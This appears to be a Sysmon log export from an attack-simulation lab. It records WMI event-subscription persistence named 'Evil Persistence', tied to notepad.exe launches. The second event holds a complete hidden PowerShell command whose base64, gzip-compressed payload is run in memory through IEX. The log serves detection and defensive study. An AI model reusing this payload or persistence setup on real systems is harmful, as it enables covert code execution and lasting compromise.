{"preview":false,"result":{"_time":"2021-06-16T15:21:12.683+0400","EventRecordID":"53919","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>19</EventID><Version>3</Version><Level>4</Level><Task>19</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-06-16T15:21:12.683402000Z'/><EventRecordID>53919</EventRecordID><Correlation/><Execution ProcessID='1972' ThreadID='1528'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-host-14.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>WmiFilterEvent</Data><Data Name='UtcTime'>2021-06-16 15:21:12.683</Data><Data Name='Operation'>Created</Data><Data Name='User'>WIN-HOST-14\\Administrator</Data><Data Name='EventNamespace'> \"root/cimv2\"</Data><Data Name='Name'> \"Evil Persistence\"</Data><Data Name='Query'> \"select * from Win32_ProcessStartTrace where ProcessName='notepad.exe'\"</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2021-06-16T15:21:12.703+0400","EventRecordID":"53920","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>20</EventID><Version>3</Version><Level>4</Level><Task>20</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-06-16T15:21:12.703646000Z'/><EventRecordID>53920</EventRecordID><Correlation/><Execution ProcessID='1972' ThreadID='1528'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-host-14.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>WmiConsumerEvent</Data><Data Name='UtcTime'>2021-06-16 15:21:12.703</Data><Data Name='Operation'>Created</Data><Data Name='User'>WIN-HOST-14\\Administrator</Data><Data Name='Name'> \"Evil Persistence\"</Data><Data Name='Type'>Command Line</Data><Data Name='Destination'> \"powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA3AFYAWAA2ADMATwBpAFMAaABiAC8ASABQADgASwBQAHEAUgBLAHIAVABGAGUARgBaAE4ASgBaAGkAdABWAEEAeQBJAEsAUQBhAEwAaQBPAHoAZQBWAGEAcgBwAGIAZwB2AEkAUwBHAGcASAB2AHoAUAArACsAQgA5AFQAYwB6AEUANQBtAGQANgBwADIAMQB5AHIASwBmAHAAegBuADcAegB3ADQARwBKAFIAZABHAFMAeQAwAE0AUgB2ADQAaABIAEoAWABNAHgAcABHAHQAdQA5AHgAcgBWAEwAcABVAHYASQBWAHgAdAAxAHoAWAA4AHUAbABkAGUAeABoAGwAaAAvAG4AaQB4AGUATABzAHAAYwBnADkAUABFAEwASQBpAFMAawBVAGMAVAA5AFYAYgBvAFkAbwBoAEMANQBYAE8AVgB5AGoAOABJAFgAMQB5AGUAeABRADIAdABjAHMAYwBrAEoASwBZAGwARABXAHIAMgA0AEsARgAwAFUAUgA3AEUAWABvAFQAVgA5ADgAUgBDAHoAOQAvAFQARgBwAGUAegBWAEoAeABFAG8AcQBqAHcASgBRAFMARAA1AEwAcgBLADkANQB5ADkAZgBPAG4ARQBZAFUAbwA4AGQAOQAvAFUAZQBaAFUASQBVAFUAZABkADAAYgBCAHAAVgBxAHQAdwAzAGIAdgA1AEsAUQAzAHIAMQBhAEcANABvAFoAdAB4AGYAMwBPAFYATAB2AGUAZgA0AEoAbgBKAE8AWgBGAGsASAA0AFYAZAB3AFMAUABCAEkAZgBxAGYANQBHAE8AVQBlADEASQAzAEEAcwBWAG0AbAAvAE8AZQBmADUAZQByAFQAVgBmAE8ANQAzAHQAMwBGAHkASQBrAHEAWgBTAE8ATABHAEgAWAByAHgASABIAEsAVgBlADUANwBOAFYAYwA0AHkAUQBKAGEASwBRADkAcwBIAFAAcQBSAHYAMgBiADEAdQBlADMAeAByAGYAcQAwAHMARgA0AHYAagBCADgAYwBiAFMAOQBYAFQANQA1AFoAQQBRAEkALwBmAHUAMQBrAEwAdgBYAEkAVQB5AG4ARABjAGcAagBZAEMARQBjAE0AeQB6AFgAdQBLAGQAZgAzADkAUAB6AE0AZgBYADIAegBaAGgAeAA3AHoASABaAHAAWABmAEUAWQBEAGYAMwBBAG8ATwBIAGUAeABqAFMAcQA5ADUARgBIAEgARABxAG0AYQAyAEEAcgBSAHgAQQArAHoAeQBwAFgAdwBZAGkAUQBzAGoAagAwAHUATABNAHQAdwBMAGYAMwB0ADcAUgB5ADYAYwBXAE8AVQB3AE8ANQBUADcAOAByADkANwBtAGkAMAArAFEATQA3AHUAOAB5AFYAZAA0AHoAQQBkAFcAUQBoAGQAWABhAEsAUwBkACsAQgA0ADUAQgBrAFQAZABIAGMAZQBEAE8AVAA5AGEALwBTADYANABxAC8ASAA1AEsAcwBHAHIAcABlACsAbQBEAFYAQwBYAFUAbwBSAFoAaQA5AEkAVQBCAHYAdQA5AHkAdABYAFIAeAA4AFYAUQBzAEsAZgBoAFQARwBmAHEAUgBYAGYARABkAGMANAAwAGEATgB3AEEAagBFAFAAUABEAEwAQQAvAG4ASgBJAHgAcAA5AGYAbgB2ACsAQgB6AFYAbgBqAG0AagAyAGkAOABGAE4AYwA5AGMASgA1ADUAagBlAEkANQAyADMASABOAFAATQA5ADgAbQB6ADYAVwBMAGEAdQBtAFUAUABmAG4ANQBpAHgAbgBiAEQAcQBGAGgAZgB2AC8AcgBhAHAARABvADIAdgBhAG8AbABIAG4ASQB0AGYARQA1ADQAUwBzAGYAeABZAHkAdQBIAFYAcgBnAFUAVAArAFQANgBXAEIAbgBwAFgAeQA2AG8ARQBRADYAbwBWAFAATwBBAFgAMwA2AG0AYQAzAHIAMgB1AHkATgBWAHoAdwBhAEoAMgBDAEkAZQB3AFIAVwBRAFUAcABVAGYAegBUAG0ARwBNAE4ASwBXAGYARQBHADEAQQBYADgAagBuAHQASQAwADgAcwAxAGwAQgBrADkAVQA1ADkASwBLAHoAdAByAHoALwBkADUATABuAGMAYwBGAEUAVQAxAGIAaABoAEQAbgBlAE0AYQBaADEARABrAFUARgBMAGoAQgBDACsAeQBUADEAZABDAHoAUAB4AGkAVwBmADcAYgAzAEUASABzAE0AQgB1AGoAaQBKADMARgBQAFYAYwAvAGcAUABTAGsAdQB1AE4ANwBVAEQARQB4AGgAdQBnAEMARABCAE0AagBvAE4AaABHAFQAbwA1AEsAagBlAHYAYgBoAEkAcQBaAFkAVgB0AG4ARQA4AG8AZgBZAHQASgBCAGoAZwBNAGwAQgA1AEwAMgBFAEIATQA0AHkAYgBFAHcAVwBKADQAegBJAGEAbgA5AGEAMwA1AFUANgB3AFoAbABpAGgAcwA0ADEAQQBYAHEAbwBnAHYASgBEAHIASwBnADUANQB3AHEAcQBrAGcAMwBaAEYARgBTAC8AagBkAG0AbgArAHYAawBXAEIAUQA1AFYAbQBlAFEAMwBoAGsATgBDAFcAQQA0AFAAcQB0AHgATQB6AHQAawAwAE4AZgBLAHQAWgA4AFMANwA3ADgAegA3ADgAYwBXADgANABPAFoAbgBaAEMAZQBBAGwAawBwAEMAdgBGAEoAegBGAGgAZQBMAGcAVQBsAHoAbAA4AHUAOQAyADkAWQBGAHMAaQBGAEQARgBDAFQAUQA5ADgAVgBVAFUAUgB2ADIAawBiAFIAeABpAHAAbAAvAGoAYgBlAEsAZABsAGcATQA3AG8ASgBlADkAMgA5ADMATgAvADEAdQB4AE4ANAA5AHYARAB3AE8ANwBtAHIAYQBlAG8ANABFAE0AYwBhADcAcwBhAFAAdwAzADUARABYAFMAdQBqAFcANgBrAGQASgA3AEUAUwBUADgAUQBHAEwAegBlAEEANwByAEQAcgBkAGQAZgBLAC8AdABGAGYATgBtAE8AMwAzAFMAUwBCAHMAdABmAGgATABQAHEAOAA2ADAAZQBTAHMAcABlAEUAZgBtAHYAbgB5AHoAZQBXAGYAWABlAFMAYwArAFEAZgBtAFUAbgBUAFgAQwBqAHkAWgA3AE0AbgB0AC8AdQB6AFMATQA3AHAAKwA4AHAAZQBsAEgAZQBkAE8AeAAvAFcAZgB5AGoANwBqAHEAOABDADMAKwAxAE4ANABJAGsASgBhAGQATwB1AGUAawBNAFgARwBrADUANABkAGsAdQBSAGwAVwBZAFAAcwAwADkARwBvADkAbQBiAFoAYgBvADIANgB3AGEANgA0AFIASABOAGIASQA1AGsAVgBUACsAMABNAHYAQQBKAC8ARABMADQALwByAGgAQgA0AEQARgBTAHAAegBuADMASgAvAGcAdQAyAHYAVgB6AGYANgBtAG8ANwBiAEMAbgBxAGsAcABmAHoAWQB4AHIAeQAxAFkAeQBQAGMARQBOADEAdABpAEYAQgA0AGMAZgByAGcANwBaADcAaABiADQAOQBUAFoAZwBrAGgAcgBaAFkATgB5ACsASQBTAGwAZQB5AEEAbABlADYARgByAFcAWAArAG8AOQAwAEwARwBMADUAMQBhADcAcgAyAHQAKwBLAG0AeQBVAG0AMQBBAHkARABIAEkAdwBKAG0AbgBUAGEASwA2AGMAUABWAHIAZwBPAHkAOABwADkAQgBzAGsAVABjAGcAMABlAGwAUQBuAGIATQBrAFAAawBkAHYATwBNAHUALwBHAFUARABaAEsAcQB1AEcAQQB6AFIAYgBxAFQAWQBpAHkAVABxAEQAWgAxAEIAVABYAEwASgBlAHIAYQBpAHQATAB2AGUAdgBDAHUAcwB2AFMAaABtAEcATQBNAHcASgA2AG4AZgA1AEUAZQBnAEMAOQBYAG0AYwB3AEEAQgAvAFEAdABiAHoAYwBVAG4ANwA0AE0ATgBjAFAAbQBCAGMAMQBuAEkAVQBLACsARABGADgAdQBMAEYAQgA5AGkAMABiADgASABBAHUAeQBjAHEASQBUAEwAcwBiADIAVQAwADYATwBGAGwAdABsAHAANwBlAGwAdgBtADcAQQAxADEARQBjAHoAbABoAGgALwBYAEkAbgB5ADUANwB3AG8ATQBNAE0AVgBpADUAZwBiAFgAMAB1AG8AKwA0AFQAMgB4AHoAVABtAHcAOAB4ADQAOQBMAHQAOABrAGoAYgA3AGIARABpADEAVQBpAGUAYwBUAEYAZgBmAHkANABtAGcAZgA3AGwAYQBYADAAVQBmAEkAYQBkAG8AegBCADMAQgBUAFUAZwAyAGoAcgByAFcAbAAzAE4AWgBaAGMAdABUAHYAZQBOAGgAZQA5AGsAUgA1AFAAWgBPAGQAaAAwAHIAagByAFMATwBKAFMANwB5AFkARABiAGQAUgBOAEgANgBjAE4AZABXAEYAcwA1AGUASAA0ADEAWgBKAE0AVAA5AHkAdAByAEEARwBTAHgAbwBPAGwAdwBJADgAZgBKAGwATQB5AG0ATQBtAEMAWgBDADcAQQA3AEYASABEADYAQQBsADYAdwA5AGcAMgBaAG4ASgBxAFMAZgBOADAAdQBvAEEAOQBQADUAMABHAC8AVgB4ACsASQBSAFAATwBUAFYAZQBOAHUAeQBNAC8AZgBqAGoAYgA0AGUAbwAyADUAcQAzAEYAbQB0AGUAdgBhAGIAcABjAGQASABqADkAcgB2AE0ANgB0AHAAYQBDAFAAMQAxAFkAeABFAFcAdQBhAE8AUABSAGQAVQBKAGEASwBsAHUAMQAxAEgAUwBWAFgATgB2AG0AZwB1AHoASQBQAEUAaQBKAEoAegB5AFMAMQBpAG8AaAB5AGIAVwBEADMARAB0AFgAcwBFAGoAWQA2AFUAVwBxAGsAcQA0AGkAdwBSAHYAMABsAGkAMwAxAFEARQBYAHkAQgArAGEAZAB6AC8ASQByADEAagBEAGYAZQBKAEIANwBvAGcAWAB5AHEAZABoAGEANwBaAFkAOQBOAFoAVQA4AGsAUQBmAE0AdgBLAFUAbgBlADQAQQBGAEkANgAyAGcAaQBUAHkANQBoAFkAVgByAGYAZwBWADMAawBqAHYAYgBtAGEAMQBsAFIAMgB4AEYAQwBrAHEAMgAvACsAZQA0AEsAQgB2AGoANwBuAEYAdQBMAFMAQQBYAHQAOAA0AEcAOAB2AGcAQQBPAGEAMwBCAHMAMQBIADQAcwBVAGIAYgBKAEUAawBoAHgAeQBMAFYAegAyAHQAbABvACsAeQBEAEQARAArAEUAWABkAEsATgBOAGcATABzAGMAWAArAG0ARABjAHoANQBMAGkARwBIAFYAaABEAHIAaQAyAHQAawBiAFoAVwA0AEEAegBWAHUAOQB1AGcAbgBTAGQAdQB4AHoANQBqAHYAWAB2AGUAbQBVADEARQBiAGIAWgB0ADkAdwAzAEYANgAwAGwAVABzAHoAQgBwAE8AWgA3AEsAZAA5AGEAWQB5ADEAdgBPAFkASwA4AGQAYQB2AE0AOAA3ADIAdABvAFAAWQBVAFoASgA4AC8AZgArAFAAegBqADQAdgAzAEkAWQA5ADkAYQB6AG8ARgBOAEIARQA4AHoAUABQADMAMgBxADUAcgBQAEQAMgA4ADMAVABaAGYAcAA4AG4AdgBYAGUAOQBsAGQAbQBDAHQATAA0ADYANwB6AC8ARgBUAGQANwA5AEsANwByAC8AVwBxAEEARwBxAEEAdwBlAGsAVQBPAGQARQBNAFkAZwBzADYAdgBNAE4AawBQADUAZABNAG8ATQAvAFQAdABuAEsATgBTACsAWABqADYAMwB0AEwAUQBvAHcANQBNAHAAagBDADcAbgBoAHUALwA0AEQAZwArAHoAbwBlAHYAWAAwAHgAQgBNAEEAbwBlAEIANwBSAG4AZQBNAEYATgBZAGMAbQAzAFAAbAB4AFYAdQBUAGQAQwBtAEwAaQBPAFAAcABuAHgAZQBsADAATQBLAEMAYwBQAHoAMwBQAGEAbQBmAEQATABsAHgAVwA0AFYAMwBzAEgAbwBrAFkAOQBpADcAMwBXAHUARQBiAEsATgB4AHEATgAvAEwALwBkAHEASgBaACsASAA1AGEATwBIADIAUwBWAE4AMwBHADEAZgBFAEIANwBaADgAbAA3AFQAVQA2AGgAcQBYAHAAQwBQADQAdwA5AGwALwA0AFAAQQAvAEMARAAwAHYAOABNAGIAUQA1AGUATQBlAE8AOQBRAFYAYwBZADkARABGAGUAMQBWAEwANQBhADYAbQBrAHIATABsADMANQA1AEYAOQBnAEMAOABZAHUAdQBOAHUAaQA5AHkATABHAEEAcgBaADEAYwBZADMANABYAE8AbgBlAEgAOQBYAEwAbABHAFYAVQA3AG8ATAA3AGgASgB4ADMANwBrAHIAYwBFACsASQArAEIAWgA4ADgANABSAFcAbgBMAC8ATQB1AGUATQBuADMARABjAHUAUQBmAGEAUgA4AFIAcwAzAHAAcABqAEMAQwBIADYAbAArAGkAWgBrAEsAWQBXAFoATABCAGQAZABDAE0AbQBKADQAZQB5AGYAMABuADQAUwA5AGgATQBPAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=\"</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2021-06-16T15:21:12.758+0400","EventRecordID":"53921","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>21</EventID><Version>3</Version><Level>4</Level><Task>21</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-06-16T15:21:12.758006600Z'/><EventRecordID>53921</EventRecordID><Correlation/><Execution ProcessID='1972' ThreadID='1528'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-host-14.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>WmiBindingEvent</Data><Data Name='UtcTime'>2021-06-16 15:21:12.757</Data><Data Name='Operation'>Created</Data><Data Name='User'>WIN-HOST-14\\Administrator</Data><Data Name='Consumer'> \"CommandLineEventConsumer.Name=\\\"Evil Persistence\\\"\"</Data><Data Name='Filter'> \"__EventFilter.Name=\\\"Evil Persistence\\\"\"</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2021-06-16T21:46:49.337+0400","EventRecordID":"151610","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>19</EventID><Version>3</Version><Level>4</Level><Task>19</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-06-16T21:46:49.337327900Z'/><EventRecordID>151610</EventRecordID><Correlation/><Execution ProcessID='1972' ThreadID='3648'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-host-14.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>WmiFilterEvent</Data><Data Name='UtcTime'>2021-06-16 21:46:49.322</Data><Data Name='Operation'>Modified</Data><Data Name='User'>WIN-HOST-14\\Administrator</Data><Data Name='EventNamespace'> \"root/cimv2\"</Data><Data Name='Name'> \"Evil Persistence\"</Data><Data Name='Query'> \"select * from Win32_ProcessStartTrace where ProcessName='not-notepad.exe'\"</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2021-06-16T21:46:50.225+0400","EventRecordID":"151644","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>21</EventID><Version>3</Version><Level>4</Level><Task>21</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-06-16T21:46:50.225290200Z'/><EventRecordID>151644</EventRecordID><Correlation/><Execution ProcessID='1972' ThreadID='3648'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-host-14.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>WmiBindingEvent</Data><Data Name='UtcTime'>2021-06-16 21:46:50.222</Data><Data Name='Operation'>Modified</Data><Data Name='User'>WIN-HOST-14\\Administrator</Data><Data Name='Consumer'> \"CommandLineEventConsumer.Name=\\\"Evil Persistence\\\"\"</Data><Data Name='Filter'> \"__EventFilter.Name=\\\"Evil Persistence\\\"\"</Data></EventData></Event>"},"lastrow":true}
